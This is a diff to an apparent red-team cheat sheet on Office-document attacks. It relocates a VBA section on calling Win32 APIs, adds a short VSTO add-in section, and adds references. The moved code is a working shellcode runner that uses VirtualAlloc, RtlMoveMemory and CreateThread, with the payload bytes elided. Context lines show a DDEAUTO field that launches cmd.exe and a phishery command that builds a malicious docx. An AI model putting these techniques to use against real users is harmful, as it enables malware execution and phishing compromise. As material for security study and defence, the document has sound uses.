@@ -4,7 +4,6 @@
 
 * [Office Products Features](#office-products-features)
 * [Office Default Passwords](#office-default-passwords)
-* [Office Macro execute WinAPI](#office-macro-execute-winapi)
 * [Excel](#excel)
     * [XLSM - Hot Manchego](#xlsm---hot-manchego)
     * [XLS - Macrome](#xls---macrome)
@@ -35,6 +34,9 @@
     * [VBA - Offensive Security Template](#vba---offensive-security-template)
     * [DOCX - Template Injection](#docx---template-injection)
     * [DOCX - DDE](#docx---dde)
+* [Visual Studio Tools for Office (VSTO)](#visual-studio-tools-for-office-vsto)
+* [Office Macro Development](#office-macro-development)
+    * [Execute WinAPI](#execute-winapi)
 * [References](#references)
 
 
@@ -53,61 +55,6 @@ By default, Excel does not set a password when saving a new file. However, some 
 |------------|------------------|-------------------|
 | Excel      | VelvetSweatshop  | all Excel formats |
 | PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |
-
-
-## Office Macro execute WinAPI
-
-### Description
-
-To importe Win32 function we need to use the keyword `Private Declare`
-
-```vb
-Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>
-```
-
-If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
-Importing the `GetUserNameA` from `advapi32.dll`: 
-
-```vb
-Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
-```
-
-`GetUserNameA` prototype in C: 
-
-```C
-BOOL GetUserNameA(
-  LPSTR   lpBuffer,
-  LPDWORD pcbBuffer
-);
-```
-
-### Example with a simple Shellcode Runner
-
-```vb
-Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
-Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
-Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
-
-Sub WinAPI()
-    Dim buf As Variant
-    Dim addr As LongPtr
-    Dim counter As Long
-    Dim data As Long
-
-    buf = Array(252, ...)
-    
-    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
-    
-
-    For counter = LBound(buf) To UBound(buf)
-        data = buf(counter)
-        res = RtlMoveMemory(addr + counter, data, 1)
-    Next counter
-    res = CreateThread(0, 0, addr, 0, 0, 0)
-    
-
-End Sub
-```
 
 
 ## Excel
@@ -769,6 +716,63 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 * `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
 
 
+## Visual Studio Tools for Office (VSTO)
+
+A VSTO file is a project file created with Visual Studio Tools for Office, a set of development tools provided by Microsoft for building custom add-ins and solutions for Microsoft Office applications. These projects allow developers to enhance the functionality of Office programs like Excel, Word, and Outlook by integrating additional features, automation, and user interface customizations.
+
+* Visual Studio > `Word 2013 and 2016 VSTO Add-in`
+
+
+
+## Office Macro Development
+
+### Execute WinAPI
+
+To importe Win32 function we need to use the keyword `Private Declare`
+
+```vb
+Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>
+```
+
+If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
+Importing the `GetUserNameA` from `advapi32.dll`: 
+
+```vb
+Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+```
+
+`GetUserNameA` prototype in C: 
+
+```C
+BOOL GetUserNameA(
+  LPSTR   lpBuffer,
+  LPDWORD pcbBuffer
+);
+```
+
+### Example with a simple Shellcode Runner
+
+```vb
+Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Sub WinAPI()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    buf = Array(252, ...)
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Sub
+```
+
+
 ## References
 
 * [VBA RunPE Part 1 - itm4n](https://itm4n.github.io/vba-runpe-part1/)
@@ -799,3 +803,7 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 * [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
 * [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019 ](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)
 * [VenomousSway - VBA payload generation framework / Retired TrustedSec Capabilities - Trustedsec - May 22, 2024](https://github.com/trustedsec/The_Shelf/tree/main/Retired/venomoussway)
+* [T1137.006 - Office Application Startup: Add-ins - redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md)
+* [VSTO: THE PAYLOAD INSTALLER THAT PROBABLY DEFEATS YOUR APPLICATION WHITELISTING RULES - BOHOPS - JANUARY 31, 2018](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
+* [Make phishing great again. VSTO office files are the new macro nightmare? - Daniel Schell - Apr 14, 2022](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)
+* [Analyzing VSTO Office Files - Didier Stevens - April 29, 2022](https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/)
